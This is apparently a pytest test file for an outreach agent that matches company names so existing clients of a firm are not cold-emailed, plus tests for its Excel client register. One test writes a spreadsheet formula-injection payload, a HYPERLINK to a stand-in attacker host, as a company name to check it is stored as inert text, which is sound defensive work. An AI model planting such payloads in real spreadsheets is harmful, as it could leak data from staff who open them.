"""Never cold-email a company that already buys from SUPPLECO.

A cold pitch to a current customer is not a lost prospect - it is a live
commercial relationship being handed an introduction to its own supplier.

Matching is on organisation NAME, because the client list holds no email
addresses, so the suppression list (keyed on address) cannot cover this. Names
are messy on both sides:

    the list      "A. MENARINI INDUSTRIE FARMACEUTICHE RIUNITE SRL"
    the website   "Menarini"

and the legal form alone appears four ways in one file (SRL, S.R.L., S.R.L,
SRLS). The tests below pin BOTH failure directions, because they cost
different things: a miss emails a customer, a false match silently deletes a
good prospect.
"""

import sqlite3

import pytest

import main
from modules.clients import ClientRegister, append_to_xlsx, load_from_xlsx, normalise

CLIENTS = [
    "A. MENARINI INDUSTRIE FARMACEUTICHE RIUNITE SRL",
    "ABBE' ROLAND SRL",
    "ABIA S.R.L.",
    "ABIOGEN PHARMA S.p.A.",
    "AGAIN LIFE ITALIA S.R.L.",
    "ZETA FARMACEUTICI S.P.A",
    "ZUCCARO S.R.L.",
]


@pytest.fixture
def register():
    return ClientRegister(CLIENTS)


# ── Normalisation ───────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("ABBE' ROLAND SRL", "ABBE ROLAND"),
        ("Abbé Roland S.r.l.", "ABBE ROLAND"),  # accents folded
        ("ZUCCARO S.R.L.", "ZUCCARO"),
        ("Zuccaro srl", "ZUCCARO"),
        ("ABIOGEN PHARMA S.p.A.", "ABIOGEN PHARMA"),
    ],
)
def test_names_normalise_to_a_comparable_form(raw, expected):
    """The same company is written four ways across 182 rows; a literal
    comparison matches almost none of them."""
    assert normalise(raw) == expected


# ── Real clients must be caught ─────────────────────────────────────────────


@pytest.mark.parametrize(
    "organization,expected",
    [
        ("Menarini", "A. MENARINI INDUSTRIE FARMACEUTICHE RIUNITE SRL"),
        (
            "A. Menarini Industrie Farmaceutiche Riunite S.r.l.",
            "A. MENARINI INDUSTRIE FARMACEUTICHE RIUNITE SRL",
        ),
        ("Abiogen Pharma", "ABIOGEN PHARMA S.p.A."),
        ("Zeta Farmaceutici", "ZETA FARMACEUTICI S.P.A"),
        ("Abbe' Roland", "ABBE' ROLAND SRL"),
        ("Zuccaro srl", "ZUCCARO S.R.L."),
    ],
)
def test_an_active_client_is_recognised(register, organization, expected):
    """A website names a company far more briefly than its legal record does."""
    assert register.match(organization) == expected


# ── Prospects must NOT be caught ────────────────────────────────────────────


@pytest.mark.parametrize(
    "organization",
    [
        "Zeta Packaging Ltd",  # shares only the common token ZETA
        "Farmacia Abiategrasso",  # 'ABIA' is a fragment, not a token
        "Menarinix Cosmetics",  # 'MENARINI' is a fragment, not a token
        "Nordic Wellness AB",
        "Vitalis GmbH",
        "Italia Srl",  # nothing distinctive survives normalisation
        "Generic Trading GmbH",
        "",
        None,
    ],
)
def test_a_prospect_is_not_mistaken_for_a_client(register, organization):
    """A false match silently deletes a good lead, and nobody notices a lead
    that never appeared. "Zeta Packaging Ltd" matched ZETA FARMACEUTICI until
    the client-side subset rule was restricted to multi-token clients."""
    assert register.match(organization) is None


def test_matching_is_whole_token_not_substring(register):
    """The defect family this codebase keeps shipping: "news" inside
    "newsletter", "coo" inside "coordinator", "vitamin" inside
    "multivitamin"."""
    assert register.match("Abiategrasso Pharma") is None
    assert register.match("ABIA") == "ABIA S.R.L."


def test_a_single_common_token_client_does_not_swallow_everything(register):
    """ZETA FARMACEUTICI reduces to one distinctive token. Allowing
    client-tokens ⊆ org-tokens in that case matches any company containing
    'Zeta'."""
    assert register.match("Zeta Packaging Ltd") is None
    assert register.match("Zeta Logistics") is None
    assert register.match("Zeta Farmaceutici SPA") == "ZETA FARMACEUTICI S.P.A"


# ── Why the subset rule had to go ───────────────────────────────────────────
#
# Matching used to accept either name's distinctive tokens being a SUBSET of
# the other's. A subset only needs overlap, not agreement, so it over-matched
# in both directions - and both were found against real data, not invented.


def test_a_shared_industry_word_is_not_an_identity():
    """Found in production: contact #615, b-blue.com, organisation "food.be".
    It reduced to {FOOD}, a subset of DMF DIETETIC METABOLIC FOOD's tokens, so
    a real prospect was being deleted as an existing customer."""
    reg = ClientRegister(["DMF DIETETIC METABOLIC FOOD SRL"])
    assert reg.match("food.be") is None
    assert reg.match("DMF Dietetic Metabolic Food") == "DMF DIETETIC METABOLIC FOOD SRL"


def test_two_ordinary_words_are_not_an_identity_either():
    """The other direction. AGAIN LIFE ITALIA reduces to {AGAIN, LIFE}, both
    ordinary English words - so requiring two tokens did not save it."""
    reg = ClientRegister(["AGAIN LIFE ITALIA S.R.L."])
    assert reg.match("Born Again Life Sciences Ltd") is None
    assert reg.match("Again Life") == "AGAIN LIFE ITALIA S.R.L."


def test_the_industry_own_name_carries_no_identity():
    """One real client is called NUTRACEUTICA S.R.L. - the Italian word for the
    whole sector SUPPLECO sells into. Production contact #598 (bdc28.it,
    "Nutraceutica Italiana") was blocked by it. The company is still caught by
    its exact name; a company merely describing itself that way is not."""
    reg = ClientRegister(["NUTRACEUTICA S.R.L."])
    assert reg.match("Nutraceutica") == "NUTRACEUTICA S.R.L."
    assert reg.match("Nutraceutica Italiana") is None
    assert reg.match("Bio Nutraceutica Veneta") is None


# ── Short names are not weak names ─────────────────────────────────────────


@pytest.mark.parametrize(
    "client,website",
    [
        ("EOS S.R.L.", "EOS Nutraceutici"),
        ("IMO S.P.A.", "IMO Group"),
        ("NU3 GMBH", "NU3 Nutrition"),
        ("FAR SRL", "FAR Integratori"),
        ("GEK SRL", "GEK Pharma"),
    ],
)
def test_a_three_letter_brand_is_still_recognised(client, website):
    """A four-character floor on "distinctive" tokens made every short brand
    invisible: 16 of the real 182 clients had no distinctive token at all and
    could only ever match a byte-identical string. An acronym is the most
    distinctive kind of name, not the least."""
    assert ClientRegister([client]).match(website) == client


@pytest.mark.parametrize(
    "website",
    [
        "Abiogen Biotech",
        "Abiogen Sciences",
        "Abiogen Healthcare",
        "Abiogen Solutions",
        "Abiogen Research",
        "Abiogen Ingredients",
        "Abiogen Care",
    ],
)
def test_a_corporate_descriptor_does_not_hide_a_client(register, website):
    """Identity matching is EQUALITY, so one distinctive word the register
    lacks is a miss - and a miss cold-emails a customer.

    A legal register says "ABIOGEN PHARMA S.p.A."; the company's own site is
    written by its marketing team and may say "Abiogen Biotech". Measured
    against the real 182-name file, that class of variant missed 100% before
    these words were treated as decoration and 0% after, while blocking
    exactly the same 7 of 1000 production contacts either way.
    """
    assert register.match(website) == "ABIOGEN PHARMA S.p.A."


def test_a_descriptor_alone_is_not_an_identity(register):
    """Guard: making these words generic must not make them a wildcard. A
    company whose whole name reduces to descriptors identifies nobody."""
    assert register.match("Biotech Solutions") is None
    assert register.match("Healthcare Sciences Srl") is None


def test_a_short_brand_still_does_not_match_a_stranger():
    """The floor existed to stop short tokens forcing matches. Removing it is
    only safe because identities are now compared whole."""
    reg = ClientRegister(["EOS S.R.L.", "FAR SRL"])
    assert reg.match("Eos Packaging Systems") is None
    assert reg.match("Far East Trading") is None


# ── Normalisation must not destroy the name ────────────────────────────────


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("S.A.L.F. S.p.A.", "SALF"),
        ("I.B.S.A. SRL", "IBSA"),
        ("A.C.R.A.F. SPA", "ACRAF"),
    ],
)
def test_a_dotted_acronym_survives(raw, expected):
    """Legal forms used to be stripped by a regex tolerating a dot between
    every letter, so "SA" matched the "S.A" inside "S.A.L.F." and cut it out:
    the company normalised to "L F". Two of its four identifying letters."""
    assert normalise(raw) == expected


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("Frøya AS", "FROYA"),
        ("Møller Pharma", "MOLLER PHARMA"),
        ("Łukasz Labs", "LUKASZ LABS"),
        ("Abbé Roland S.r.l.", "ABBE ROLAND"),
    ],
)
def test_letters_without_a_decomposition_are_folded_not_deleted(raw, expected):
    """NFKD splits "é" into e + a combining mark that gets dropped, but "ø" and
    "ł" are atomic - they survived NFKD and were then deleted as non-ASCII,
    splitting the word around them. "Frøya" became "FR YA"."""
    assert normalise(raw) == expected


def test_a_row_that_normalises_to_nothing_is_reported():
    """A client the matcher cannot represent must not vanish silently - that is
    a customer who gets cold-emailed with nothing anywhere saying why."""
    reg = ClientRegister(["ZUCCARO S.R.L.", "S.R.L.", "   ", "..."])
    assert "S.R.L." in reg.unmatchable
    assert reg.match("Zuccaro") == "ZUCCARO S.R.L."


# ── The agent must act on it ────────────────────────────────────────────────


def _agent(tmp_path, settings_factory, **kw):
    from agent import OutreachAgent

    a = OutreachAgent(settings_factory(db_path=str(tmp_path / "c.db"), **kw))
    a._running = True
    a.client_register = ClientRegister(CLIENTS)
    a.relevance_filter = None
    a.lead_scorer = None
    a.email_verifier = None
    return a


def test_a_client_is_dropped_during_qualification(tmp_path, settings_factory):
    a = _agent(tmp_path, settings_factory, min_lead_score_to_email=0)
    sid = a.db.log_search("q", source="test")
    cid = a.db.add_contact(sid, "info@menarini.it", organization="Menarini")

    qualified = a._qualify_contacts(
        [{"id": cid, "email": "info@menarini.it", "organization": "Menarini"}]
    )

    assert qualified == [], "an active client reached the send list"
    contact = a.db.get_contact_by_id(cid)
    assert contact["status"] == "active_client"
    assert "MENARINI" in (contact["discard_reason"] or "").upper(), (
        "the matched client must be recorded - name matching is judgement, and "
        "a judgement nobody can inspect is one nobody can correct"
    )


def test_a_prospect_still_qualifies(tmp_path, settings_factory):
    """Control: without this the gate above would pass by blocking everything."""
    a = _agent(tmp_path, settings_factory, min_lead_score_to_email=0)
    sid = a.db.log_search("q", source="test")
    cid = a.db.add_contact(
        sid, "hello@nordicwellness.se", organization="Nordic Wellness"
    )

    qualified = a._qualify_contacts(
        [
            {
                "id": cid,
                "email": "hello@nordicwellness.se",
                "organization": "Nordic Wellness",
            }
        ]
    )

    assert len(qualified) == 1


def test_the_send_path_itself_refuses_a_client(tmp_path, settings_factory):
    """Defence in depth. Direct Send, follow-up steps and retries never touch
    the qualification gate, so the check also lives at the one choke point
    every send passes through."""
    a = _agent(tmp_path, settings_factory)
    sid = a.db.log_search("q", source="test")
    cid = a.db.add_contact(sid, "info@zuccaro.it", organization="Zuccaro srl")

    sent = []

    class _Sender:
        sender_name = "S"
        smtp_username = "s@x.de"

        def dispatch_to_contact(self, *args, **kw):
            sent.append(1)
            return 1

    ok = a._process_contact(
        {"id": cid, "email": "info@zuccaro.it", "organization": "Zuccaro srl"},
        sender=_Sender(),
        account_key="",
    )

    assert ok is False
    assert not sent, "a cold email was dispatched to an active client"


def test_a_missing_client_list_does_not_break_matching(tmp_path, settings_factory):
    """Guard: no register means no filtering, not a crash - but the agent logs
    loudly at startup, because silently unfiltered is how customers get
    cold-emailed."""
    a = _agent(tmp_path, settings_factory)
    a.client_register = None
    assert a._active_client("Menarini") is None


def test_a_broken_matcher_does_not_stop_the_run(tmp_path, settings_factory):
    a = _agent(tmp_path, settings_factory)

    class _Broken:
        def match(self, org):
            raise RuntimeError("boom")

    a.client_register = _Broken()
    assert a._active_client("Anything") is None  # must not raise


# ── The workbook round-trip ─────────────────────────────────────────────────


def _workbook(tmp_path, names=CLIENTS):
    from openpyxl import Workbook

    path = tmp_path / "clients.xlsx"
    wb = Workbook()
    for n in names:
        wb.active.append([n])
    wb.save(path)
    return path


def test_the_client_list_loads_from_the_workbook(tmp_path):
    names = load_from_xlsx(_workbook(tmp_path), key="")
    assert names == CLIENTS


def test_blank_rows_are_skipped(tmp_path):
    """The file is maintained by hand, so it collects blank rows."""
    path = _workbook(tmp_path, ["ALPHA SRL", "", "   ", "BETA SPA"])
    assert load_from_xlsx(path, key="") == ["ALPHA SRL", "BETA SPA"]


def test_a_company_can_be_appended(tmp_path):
    path = _workbook(tmp_path)
    assert append_to_xlsx(path, "NUOVA AZIENDA SRL", key="") is True
    assert "NUOVA AZIENDA SRL" in load_from_xlsx(path, key="")
    assert len(load_from_xlsx(path, key="")) == len(CLIENTS) + 1


def test_a_scraped_name_cannot_become_a_live_formula(tmp_path):
    """openpyxl writes any string starting with "=" as a formula ELEMENT in the
    xlsx, not as text - confirmed against the written XML, so this is the real
    thing and not the CSV-import quirk.

    The name is not typed by the operator: modules/search.py takes it from the
    scraped page's og:site_name or <title>, so the prospect's own site chooses
    it. Marking such a company as a client would put a live formula into
    SUPPLECO's real client register, which staff open in Excel.
    """
    import zipfile

    path = _workbook(tmp_path)
    payload = '=HYPERLINK("http://attacker.example/leak","Open")'
    assert append_to_xlsx(path, payload, key="") is True

    with zipfile.ZipFile(path) as z:
        sheet = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
    assert "<f>" not in sheet, "the company name was written as a live formula"
    assert "attacker.example" in sheet, "the name must still be recorded, as text"


@pytest.mark.parametrize("lead", ["=", "+", "-", "@"])
def test_every_formula_trigger_is_defused(tmp_path, lead):
    """Only "=" is auto-converted by openpyxl today. The others are prefixed
    too, so the rule is one a reader can check without knowing which characters
    this particular library special-cases."""
    import zipfile

    path = _workbook(tmp_path)
    append_to_xlsx(path, f"{lead}SUM(A1:A9)", key="")
    with zipfile.ZipFile(path) as z:
        assert "<f>" not in z.read("xl/worksheets/sheet1.xml").decode("utf-8")


def test_an_ordinary_company_name_is_not_mangled(tmp_path):
    """Guard: the defusing must not touch names that were never dangerous."""
    path = _workbook(tmp_path)
    append_to_xlsx(path, "NUOVA AZIENDA SRL", key="")
    assert "NUOVA AZIENDA SRL" in load_from_xlsx(path, key="")


def test_appending_is_idempotent(tmp_path):
    """Marking the same company twice - or one whose legal form is punctuated
    differently - must not duplicate the row."""
    path = _workbook(tmp_path)
    before = len(load_from_xlsx(path, key=""))

    assert (
        append_to_xlsx(path, "ZUCCARO SRL", key="") is False
    )  # already there as S.R.L.
    assert append_to_xlsx(path, "Zuccaro S.r.l.", key="") is False

    assert len(load_from_xlsx(path, key="")) == before


def test_marking_a_contact_as_a_client_updates_the_workbook(tmp_path, settings_factory):
    from modules.database import Database

    path = _workbook(tmp_path)
    s = settings_factory(db_path=str(tmp_path / "m.db"), client_list_path=str(path))
    app = main.create_dashboard_app(s)
    db = Database(str(tmp_path / "m.db"))
    sid = db.log_search("q", source="test")
    cid = db.add_contact(sid, "buyer@nuova.it", organization="Nuova Azienda SRL")

    resp = app.test_client().post(
        f"/api/contacts/{cid}/action", json={"action": "mark_client"}
    )

    assert resp.status_code == 200, resp.get_json()
    assert "Nuova Azienda SRL" in load_from_xlsx(path, key="")
    assert db.get_contact_by_id(cid)["status"] == "active_client"


def test_a_contact_with_no_company_cannot_be_marked(tmp_path, settings_factory):
    """There is nothing to add to a list of company names."""
    from modules.database import Database

    path = _workbook(tmp_path)
    s = settings_factory(db_path=str(tmp_path / "n.db"), client_list_path=str(path))
    app = main.create_dashboard_app(s)
    db = Database(str(tmp_path / "n.db"))
    sid = db.log_search("q", source="test")
    cid = db.add_contact(sid, "anon@nowhere.it")

    resp = app.test_client().post(
        f"/api/contacts/{cid}/action", json={"action": "mark_client"}
    )

    assert resp.status_code == 400
    assert len(load_from_xlsx(path, key="")) == len(CLIENTS)


def test_marking_is_not_something_the_agent_does_by_itself():
    """The agent finds PROSPECTS. A prospect becomes a client when they buy,
    which happens in the sales process and is invisible from here. Nothing
    outside the operator-triggered route may append to the list."""
    import pathlib

    root = pathlib.Path(__file__).resolve().parent.parent
    callers = []
    for path in [root / "agent.py"] + list((root / "modules").glob("*.py")):
        if path.name == "clients.py":
            continue
        if "append_to_xlsx" in path.read_text(encoding="utf-8"):
            callers.append(path.name)
    assert not callers, (
        f"{callers} can append to the client list - only the operator's "
        f"explicit 'mark as client' action may do that"
    )


def test_a_real_client_in_the_backlog_would_be_caught(tmp_path, settings_factory):
    """The case that prompted this: a contact at an active client sitting in
    the pending queue, about to be cold-emailed."""
    a = _agent(tmp_path, settings_factory, min_lead_score_to_email=0)
    sid = a.db.log_search("q", source="test")
    cid = a.db.add_contact(sid, "info@abiogen.it", organization="Abiogen Pharma")
    raw = sqlite3.connect(a.db.db_path)
    raw.execute("UPDATE contacts SET status='pending' WHERE id=?", (cid,))
    raw.commit()
    raw.close()

    qualified = a._qualify_contacts(
        [{"id": cid, "email": "info@abiogen.it", "organization": "Abiogen Pharma"}]
    )

    assert qualified == []
